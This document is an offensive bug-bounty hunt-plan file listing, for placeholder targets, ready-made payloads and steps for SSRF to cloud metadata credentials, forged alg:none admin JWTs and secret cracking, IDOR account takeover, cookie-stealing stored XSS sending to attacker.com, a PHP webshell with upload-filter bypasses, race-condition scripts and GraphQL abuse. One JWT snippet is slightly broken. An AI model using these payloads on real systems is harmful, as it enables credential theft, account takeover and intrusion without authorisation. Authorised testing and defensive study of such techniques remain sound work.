# Tasks — Hunt Plans

Detailed hunting plans that define exactly what to test, how to test it,
and in what order. Each plan is bug-class-specific with target information,
payloads, expected results, and timeboxing.

---

## Table of Contents

1. [Plan Overview](#1-plan-overview)
2. [Active Plans](#2-active-plans)
3. [Plan: SSRF Testing](#3-plan-ssrf-testing)
4. [Plan: JWT Attacks](#4-plan-jwt-attacks)
5. [Plan: IDOR Testing](#5-plan-idor-testing)
6. [Plan: XSS Testing](#6-plan-xss-testing)
7. [Plan: Auth Bypass](#7-plan-auth-bypass)
8. [Plan: File Upload](#8-plan-file-upload)
9. [Plan: Business Logic](#9-plan-business-logic)
10. [Plan: Race Conditions](#10-plan-race-conditions)
11. [Plan: GraphQL Testing](#11-plan-graphql-testing)
12. [Plan: Subdomain Takeover](#12-plan-subdomain-takeover)
13. [Plan Templates](#13-plan-templates)
14. [Maintenance](#14-maintenance)

---

## 1. Plan Overview

### 1.1 Summary

```
ACTIVE PLANS: [N]
COMPLETED PLANS: [N]
PLANNED PLANS: [N]

PLANS BY BUG CLASS:
  SSRF: [N]
  JWT: [N]
  IDOR: [N]
  XSS: [N]
  Auth Bypass: [N]
  File Upload: [N]
  Business Logic: [N]
  Race Condition: [N]
  GraphQL: [N]
  Subdomain Takeover: [N]
```

---

## 2. Active Plans

### 2.1 Currently Active

```
| Plan ID | Bug Class | Target | Status | Progress | Started |
|---------|-----------|--------|--------|----------|---------|
| PLAN-SSRF-001 | SSRF | api.example.com | Active | 40% | 2026-06-07 |
| PLAN-JWT-001 | JWT | api.example.com | Active | 50% | 2026-06-07 |
| PLAN-IDOR-001 | IDOR | api.example.com | Active | 20% | 2026-06-07 |
```

---

## 3. Plan: SSRF Testing

### 3.1 Plan Overview

```
PLAN ID: PLAN-SSRF-001
TARGET:  api.example.com
STATUS:  Active
CREATED: 2026-06-07
PRIORITY: P1
ESTIMATED DURATION: 60 min

DESCRIPTION:
  Test the POST /api/avatar endpoint for Server-Side Request
  Forgery (SSRF) vulnerabilities. The endpoint accepts a URL
  and downloads the content as an avatar. Previous session
  confirmed SSRF is possible — now testing cloud metadata
  and internal service access.
```

### 3.2 Phases

#### Phase 1: Cloud Metadata (30 min)

```
GOAL: Access cloud provider metadata endpoints.

AWS Metadata:
  Endpoint:  http://169.254.169.254/latest/meta-data/
  Variants:
    - http://169.254.169.254/latest/meta-data/iam/security-credentials/
    - http://169.254.169.254/latest/user-data/
    - http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
    - http://169.254.169.254/latest/meta-data/iam/

GCP Metadata:
  Endpoint: http://metadata.google.internal/computeMetadata/v1/
  Headers:  Metadata-Flavor: Google (if required)
  Variants:
    - http://metadata.google.internal/computeMetadata/v1/project/project-id
    - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
    - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Azure Metadata:
  Endpoint: http://169.254.169.254/metadata/instance
  Variants:
    - http://169.254.169.254/metadata/instance?api-version=2021-02-01
    - http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

EXPECTED RESULTS:
  Vulnerable: Metadata content returned, IAM credentials visible
  Not vulnerable: Error, empty response, or filtered
  Partial: Some endpoints work, others blocked
```

#### Phase 2: Internal Service Discovery (30 min)

```
GOAL: Discover and interact with internal services.

Internal IPs:
  - 127.0.0.1 (localhost)
  - 10.x.x.x (private network)
  - 172.16-31.x.x (private network)
  - 192.168.x.x (private network)

Services to probe:
  - Elasticsearch: 9200, 9300
  - Redis: 6379
  - MySQL: 3306
  - PostgreSQL: 5432
  - MongoDB: 27017
  - Memcached: 11211
  - HTTP services: 80, 443, 8080, 8443, 3000, 5000, 8000, 9000

IP BYPASS TECHNIQUES:
  - Hex: 0x7f.0x0.0x0.0x1 = 127.0.0.1
  - Octal: 0177.0.0.1 = 127.0.0.1
  - Decimal: 2130706433 = 127.0.0.1
  - Short: 0 = 0.0.0.0, 0177.1 = 127.0.0.1
  - IPv6: [::1], [0:0:0:0:0:ffff:127.0.0.1]
  - DNS: localhost, localhost.localdomain, internal.service
  - Redirect: Setup redirect from external URL to internal IP
  - DNS rebinding: Setup domain with short TTL that alternates
    between external and internal IPs
```

### 3.3 Payload List

```
# AWS Metadata
{"url":"http://169.254.169.254/latest/meta-data/"}
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"url":"http://169.254.169.254/latest/user-data/"}
{"url":"http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"}

# GCP Metadata
{"url":"http://metadata.google.internal/computeMetadata/v1/"}
{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}

# Azure Metadata
{"url":"http://169.254.169.254/metadata/instance"}
{"url":"http://169.254.169.254/metadata/identity/oauth2/token"}

# Internal Services
{"url":"http://127.0.0.1:9200/_cat/indices"}
{"url":"http://127.0.0.1:6379/"}
{"url":"http://127.0.0.1:3306/"}
{"url":"http://127.0.0.1:5432/"}
{"url":"http://127.0.0.1:27017/"}

# IP Bypass
{"url":"http://0x7f.0x0.0x0.0x1/"}, {"url":"http://2130706433/"}
{"url":"http://[::1]:9200/_cat/indices"}
{"url":"http://localhost:9200/_cat/indices"}
```

### 3.4 Validation Criteria

```
SSRF CONFIRMED:
  [ ] Response contains cloud metadata content
  [ ] IAM credentials visible in response
  [ ] Internal service banner displayed
  [ ] Elasticsearch indices listed
  [ ] Redis PING response received
  [ ] Callback received from internal IP

IMPACT:
  [Cloud metadata access = Critical (IAM chain)]
  [Internal service access = High (data access)]
  [Blind SSRF (callbacks only) = Medium (further exploitation needed)]
```

---

## 4. Plan: JWT Attacks

### 4.1 Plan Overview

```
PLAN ID: PLAN-JWT-001
TARGET:  api.example.com
STATUS:  Active (alg:none confirmed, HS256 pending)
CREATED: 2026-06-07
PRIORITY: P1
ESTIMATED DURATION: 40 min

DESCRIPTION:
  Test JWT implementation on api.example.com. Previous session
  confirmed alg:none vulnerability. Now testing HS256/RS256
  algorithm confusion.
```

### 4.2 Test Cases

#### Test 1: alg:none (CONFIRMED)

```
STATUS: Confirmed
JWT HEADER: {"alg":"none","typ":"JWT"}
JWT PAYLOAD: {"sub":"admin","role":"admin"}
JWT SIGNATURE: (empty — trailing dot only)
FULL TOKEN: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
            eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
VARIATIONS:
  - alg: None (capitalized)
  - alg: NONE (uppercase)
  - alg: nOnE (mixed case)
  - alg: none (lowercase — confirmed working)
  - alg: null
  - alg: undefined
```

#### Test 2: RS256 -> HS256 Algorithm Confusion

```
STATUS: Pending

STEPS:
  1. Retrieve the JWK from /.well-known/jwks.json
  2. Extract the public key (n and e values)
  3. Convert JWK to PEM format
  4. Sign a forged JWT using the public key with HS256
  5. The server uses the public key to verify a symmetric
     HS256 signature (implementation flaw)

JWK FETCH:
  curl -s https://api.example.com/.well-known/jwks.json

JWK TO PEM CONVERSION:
  # Using python:
  pip install jwcrypto
  python -c "
    import jwt, json
    with open('jwk.json') as f:
      jwk = json.load(f)
    pem = jwt.algorithms.RSAAlgorithm.
           to_jwk_string(jwk)
    # Use the PEM to sign HS256 JWT
    forged = jwt.encode({'sub':'admin'}, pem,
             algorithm='HS256')
    print(forged)
  "

ALTERNATE ENDPOINTS:
  - GET /.well-known/jwks
  - GET /api/v1/jwks
  - GET /api/jwks.json
  - GET /jwks.json
  - GET /publickey
  - GET /api/publickey
```

#### Test 3: Weak HMAC Secret

```
STATUS: Pending

STEPS:
  1. Capture a valid JWT
  2. Try common weak secrets:
     - secret
     - secret123
     - password
     - 123456
     - changeme
     - appname
     - target
     - key
     - private-key
     - jwt-secret
  3. If secret found, forge arbitrary tokens

BRUTEFORCE:
  hashcat -m 16500 jwt.txt wordlist.txt
  john --format=jwt jwt.txt --wordlist=wordlist.txt
```

#### Test 4: kid Injection

```
STATUS: Pending

PAYLOADS:
  - {"kid":"../../../../dev/null"} (path traversal)
  - {"kid":"/etc/passwd"}  (absolute path)
  - {"kid":"../../../etc/passwd"}
  - {"kid":""} (empty)
  - {"kid":null} (null)
  - {"kid":"*"} (wildcard)
  - {"kid":"./"} (current directory)

EXPECTED RESULTS:
  Server rejects with error (not vulnerable)
  Server uses attacker-controlled file (vulnerable)
  Server crashes or returns unexpected response (possible vuln)
```

### 4.3 Validation Criteria

```
JWT VULNERABLE:
  [ ] alg:none accepted (CONFIRMED)
  [ ] HS256 signature accepted using public key
  [ ] HMAC secret cracked
  [ ] kid path traversal works
  [ ] JWK injection works

IMPACT:
  [alg:none + admin payload = Critical (full takeover)]
  [HS256 confusion = Critical (full takeover)]
  [Weak secret = Critical (full takeover)]
  [kid injection = High (variable impact)]
```

---

## 5. Plan: IDOR Testing

### 5.1 Plan Overview

```
PLAN ID: PLAN-IDOR-001
TARGET:  api.example.com
STATUS:  Active
CREATED: 2026-06-07
PRIORITY: P1
ESTIMATED DURATION: 40 min

DESCRIPTION:
  Test for Insecure Direct Object References (IDOR) across
  all endpoints that use user, account, or document IDs.
```

### 5.2 Test Cases

#### IDOR Read: GET with modified ID

```
STATUS: Pending

ENDPOINTS:
  - GET /api/v2/users/{id}
  - GET /api/v2/users/{id}/profile
  - GET /api/v2/users/{id}/orders
  - GET /api/v2/users/{id}/documents
  - GET /api/v2/orders/{id}
  - GET /api/v2/documents/{id}
  - GET /api/v2/invoices/{id}

TECHNIQUE:
  Login as user A (attacker)
  Capture request with user A's own ID
  Modify ID to user B's ID (victim)
  Observe response
```

#### IDOR Write: PUT/PATCH with modified ID

```
STATUS: Pending (previous session found write access)

ENDPOINTS:
  - PUT /api/v2/users/{id}/profile
  - PATCH /api/v2/users/{id}/profile
  - PUT /api/v2/users/{id}/settings
  - DELETE /api/v2/users/{id}
  - PUT /api/v2/orders/{id}
  - PUT /api/v2/documents/{id}
  - PUT /api/v2/users/{id}/role

TECHNIQUE:
  Login as user A
  PUT /api/v2/users/{victim_id}/profile
  Body: {"email": "attacker@evil.com"}
  This changes the victim's email to attacker's email
  Then trigger password reset to take over victim account
```

#### IDOR Sequential Enumeration

```
STATUS: Pending

TECHNIQUE:
  Capture a valid ID from the response
  Increment/decrement to find other users' documents

IDS TO TRY:
  - Current ID + 1
  - Current ID - 1
  - Current ID + 10
  - Current ID + 100
  - Current ID + 1000
  - UUIDs: increment last character
  - Base64 encoded IDs: decode, modify, re-encode

AUTOMATION:
  for ($i = 1; $i -le 100; $i++) {
    curl -s -H "Auth: Bearer $token" 
         "https://api.example.com/api/v2/users/$i/profile"
  }
```

#### Mass Assignment

```
STATUS: Pending

ENDPOINTS:
  - POST /api/register
  - POST /api/v2/users
  - PUT /api/v2/users/{id}/profile

PAYLOADS:
  {"email":"test@test.com","password":"test123","role":"admin"}
  {"email":"test@test.com","password":"test123","is_admin":true}
  {"email":"test@test.com","password":"test123","permissions":"*"}
  {"email":"test@test.com","password":"test123","verified":true}
  {"email":"test@test.com","password":"test123","account_type":"premium"}
```

### 5.3 Validation Criteria

```
IDOR CONFIRMED:
  [ ] Read: Victim data returned to attacker
  [ ] Write: Victim data modified by attacker
  [ ] Mass assignment: Unauthorized field modification

IMPACT:
  [Write IDOR + email change = Critical (ATO chain)]
  [Read IDOR + sensitive data = High (data exposure)]
  [Mass assignment + admin role = Critical (privilege escalation)]
```

---

## 6. Plan: XSS Testing

### 6.1 Plan Overview

```
PLAN ID: PLAN-XSS-001
TARGET:  app.example.com
STATUS:  Planned
PRIORITY: P2
ESTIMATED DURATION: 30 min
```

### 6.2 Test Cases

```
REFLECTED XSS:
  Endpoints:
    - GET /search?q={input}
    - GET /api/users?name={input}
    - GET /error?msg={input}

  Payloads:
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    "><script>alert(1)</script>
    ';alert(1)//
    <svg/onload=alert(1)>

STORED XSS:
  Endpoints:
    - POST /api/profile/bio
    - POST /api/comments
    - POST /api/support/tickets

  Payloads:
    <script>fetch('https://attacker.com/'+document.cookie)</script>
    <img src=x onerror=fetch('https://attacker.com/'+document.cookie)>
```

### 6.3 Validation Criteria

```
XSS CONFIRMED:
  [ ] Alert box fires (reflected)
  [ ] Callback received (stored)
  [ ] Cookie exfiltrated
  [ ] Non-self execution (no user interaction required)

IMPACT:
  [Stored XSS = High to Critical]
  [Reflected XSS (non-self) = Medium to High]
  [Self-XSS = Informative — KILL]
```

---

## 7. Plan: Auth Bypass

### 7.1 Plan Overview

```
PLAN ID: PLAN-AUTH-001
TARGET:  admin.example.com
STATUS:  Planned
PRIORITY: P2
ESTIMATED DURATION: 30 min
```

### 7.2 Test Cases

```
HEADER INJECTION:
  - X-Forwarded-For: 127.0.0.1
  - X-Forwarded-Host: internal.admin
  - X-Real-IP: 127.0.0.1
  - X-Forwarded-Proto: https
  - X-Original-URL: /admin
  - X-Rewrite-URL: /admin
  - X-Forwarded-For: 10.0.0.1
  - X-Forwarded-For: 172.16.0.1

PATH TRAVERSAL:
  - /admin/../dashboard
  - /api/../admin
  - /api/v1/;/admin
  - /api/v1/..;/admin
  - /api/v1/%2e%2e/admin

METHOD TAMPERING:
  - GET /api/admin/dashboard (requires POST)
  - POST /api/admin/dashboard (requires PUT)
  - PUT /api/admin/dashboard (with ?_method=GET)
  - HEAD /api/admin/dashboard
  - OPTIONS /api/admin/dashboard

DIRECT ACCESS:
  - /api/admin/dashboard (without auth)
  - /api/admin/dashboard (with low-privilege token)
  - /api/v2/admin/dashboard (different version)
  - /internal/api/admin/dashboard
```

### 7.3 Validation Criteria

```
AUTH BYPASS CONFIRMED:
  [ ] Admin data accessible without admin role
  [ ] Internal endpoint accessible from external
  [ ] Sensitive action performed with low privileges

IMPACT:
  [Full admin access = Critical]
  [Partial admin access = High]
  [Low sensitivity bypass = Medium]
```

---

## 8. Plan: File Upload

### 8.1 Plan Overview

```
PLAN ID: PLAN-UPLOAD-001
TARGET:  api.example.com
STATUS:  Planned
PRIORITY: P2
ESTIMATED DURATION: 30 min
```

### 8.2 Test Cases

```
WEBSHELL:
  Filenames:
    - shell.php
    - shell.php.jpg (double extension)
    - shell.pHp (case variation)
    - shell.php%00.jpg (null byte)
    - shell.asp;.jpg (semicolon)
    - .htaccess (override config)

  Content:
    <?php system($_GET['cmd']); ?>
    <%= `id` %>
    <script runat="server">...
    (PowerShell/.NET in ASPX)

SVG XSS:
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>

ZIP SLIP:
  Archive containing ../../../etc/passwd

XXE IN DOCX:
  Office document with embedded XXE payload
```

### 8.3 Bypass Techniques

```
1. Double extension: shell.php.jpg
   Bypasses server checks that look at last extension only

2. Magic bytes: GIF89a;<?php system($_GET['cmd']); ?>
   Bypasses magic byte checks with valid header

3. Null byte: shell.php%00.jpg
   Cuts filename at null in some parsers

4. Case: .pHp, .Php, .PHP
   Bypasses case-sensitive extension checks

5. .htaccess: Upload .htaccess
   Enables PHP execution in upload directory

6. MIME spoof: Change Content-Type to image/jpeg
   Bypasses MIME type checks

7. Size limits: Just under limit
   Bypasses file size validation

8. Content-type: application/x-httpd-php
   Forces PHP execution

9. Polyglot: GIF+PHP polyglot
   Valid image that is also valid PHP

10. Unicode: shell.%C0%AEphp
    Unicode normalization bypass
```

---

## 9. Plan: Business Logic

### 9.1 Plan Overview

```
PLAN ID: PLAN-LOGIC-001
TARGET:  app.example.com
STATUS:  Planned
PRIORITY: P3
ESTIMATED DURATION: 30 min
```

### 9.2 Test Cases

```
NEGATIVE QUANTITIES:
  - POST /api/cart/add with quantity: -5
  - POST /api/cart/add with quantity: 0
  - POST /api/checkout with coupons: -50%
  - POST /api/transfer with amount: -100

RACE CONDITIONS:
  - POST /api/coupon/redeem (send 10 simultaneous)
  - POST /api/wallet/withdraw (send 5 simultaneous)
  - POST /api/like (send 50 simultaneous)

PRICE MANIPULATION:
  - POST /api/cart/add with price: 0
  - POST /api/cart/add with price: 0.01
  - POST /api/checkout with price in body

FUNCTIONALITY ABUSE:
  - POST /api/invite/send to self (unlimited invites)
  - POST /api/referral with self-referral
  - POST /api/feedback repeatedly (spam)
  - POST /api/rating with decimal or negative values

BYPASS WORKFLOWS:
  - Skip payment step, go directly to confirmation
  - Reuse same transaction ID twice
  - Complete registration without email verification
  - Access post-login page without logging in
```

### 9.3 Validation Criteria

```
BUSINESS LOGIC CONFIRMED:
  [ ] Financial impact demonstrated
  [ ] Service abuse demonstrated
  [ ] Workflow bypass demonstrated

IMPACT:
  [Financial loss = High to Critical]
  [Service abuse = Medium to High]
  [Workflow bypass = Medium]
```

---

## 10. Plan: Race Conditions

### 10.1 Plan Overview

```
PLAN ID: PLAN-RACE-001
TARGET:  api.example.com
STATUS:  Planned
PRIORITY: P3
ESTIMATED DURATION: 30 min
```

### 10.2 Test Cases

```
COUPON REDEMPTION RACE:
  Endpoint: POST /api/coupon/redeem
  Method: Send 20+ requests simultaneously
  Expected: One success — coupon has limited uses
  Vulnerable: Multiple successes — coupon used N times

WITHDRAWAL RACE:
  Endpoint: POST /api/wallet/withdraw
  Method: Send 10 requests simultaneously
  Expected: One success or rejection after balance depletes
  Vulnerable: Multiple withdrawals succeed before balance update

LIKE/FOLLOW RACE:
  Endpoint: POST /api/users/{id}/like
  Method: Send 100 requests simultaneously
  Expected: One like recorded
  Vulnerable: Multiple likes recorded

REGISTRATION RACE:
  Endpoint: POST /api/register (username must be unique)
  Method: Send 5 requests with same username simultaneously
  Vulnerable: Multiple accounts created with same username
```

### 10.3 Tools

```
BURP TURBO INTRUDER:
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=10,
                              requestsPerConnection=100,
                              pipeline=True)
      for i in range(20):
          engine.queue(target.req, [i])

  def handleResponse(engine, target, response):
      table.add(response)

CURL BASH:
  for i in {1..20}; do
    curl -s -X POST -H "Auth: $token" \
         -d '{"coupon":"FREE50"}' \
         https://api.example.com/api/coupon/redeem &
  done
  wait
```

---

## 11. Plan: GraphQL Testing

### 11.1 Plan Overview

```
PLAN ID: PLAN-GQL-001
TARGET:  api.example.com/graphql
STATUS:  Planned
PRIORITY: P3
ESTIMATED DURATION: 30 min
```

### 11.2 Test Cases

```
INTROSPECTION:
  query {
    __schema {
      types {
        name
        fields { name type { name kind } }
      }
    }
  }

BATCHING / RATE LIMIT BYPASS:
  Send multiple mutations in single request:
  mutation {
    r1: resetPassword(token:"t1", pass:"a")
    r2: resetPassword(token:"t2", pass:"a")
    r3: resetPassword(token:"t3", pass:"a")
  }

IDOR IN NESTED QUERIES:
  query {
    user(id: 1) {
      email
      posts { title content }
      friends { email }
    }
  }

DEPTH-BASED DOS:
  query {
    user { posts { author { posts { author { ... } } } } }
  }
```

---

## 12. Plan: Subdomain Takeover

### 12.1 Plan Overview

```
PLAN ID: PLAN-SDTO-001
TARGET:  *.example.com
STATUS:  Planned
PRIORITY: P3
ESTIMATED DURATION: 20 min
```

### 12.2 Test Cases

```
CNAME SCANNING:
  1. Find CNAMEs pointing to external services
  2. Check if external service is still provisioned
  3. Common takeover services:
     - AWS S3, CloudFront, Elastic Beanstalk
     - Azure, GCP services
     - GitHub Pages
     - Heroku
     - Shopify
     - Squarespace
     - WordPress.com
     - Tumblr
     - Ghost
     - Intercom
     - Zendesk
     - Helpscout
     - Freshdesk
     - Statuspage
     - Readme.io
     - Cargo Collective
     - Surge.sh
     - Unbounce
     - Instapage
     - Bitbucket
```

---

## 13. Plan Templates

### 13.1 Bug Class Plan Template

```
PLAN ID: PLAN-{CLASS}-{XXX}
TARGET:  [domain]
STATUS:  [Planned/Active/Completed]
PRIORITY: [P1/P2/P3]
ESTIMATED DURATION: [N] min

DESCRIPTION:
  [brief description]

PHASES:
  Phase 1 ([N] min): [description]
  Phase 2 ([N] min): [description]
  Phase 3 ([N] min): [description]

TEST CASES:
  1. [test case]
  2. [test case]

PAYLOADS:
  - [payload]
  - [payload]

EXPECTED RESULTS:
  Vulnerable: [response]
  Not vulnerable: [response]

VALIDATION:
  [ ] Confirmed
  [ ] Impact demonstrated
  [ ] Evidence captured
```

---

## 14. Maintenance

```
DAILY:
  [ ] Update plan status after each session
  [ ] Add new test cases based on discoveries
  [ ] Note IP bypass techniques that worked

WEEKLY:
  [ ] Review plan effectiveness
  [ ] Add new attack techniques
  [ ] Retire outdated test cases
  [ ] Study disclosed reports for new ideas

MONTHLY:
  [ ] Full plan review
  [ ] Update payload lists based on new research
  [ ] Add new bug classes as learned
```

---

*End of hunt-plans.md*
